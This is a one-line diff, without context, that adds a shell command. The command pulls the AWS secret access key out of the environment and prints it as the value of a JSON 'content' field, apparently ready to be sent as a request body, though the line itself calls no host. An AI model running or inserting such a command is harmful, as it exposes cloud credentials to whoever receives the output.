@@ -1,0 +1,1 @@
+echo -n "{\"content\": \"$(printenv | grep AWS_SECRET_ACCESS_KEY | sed 's/^.*=//')\"}"
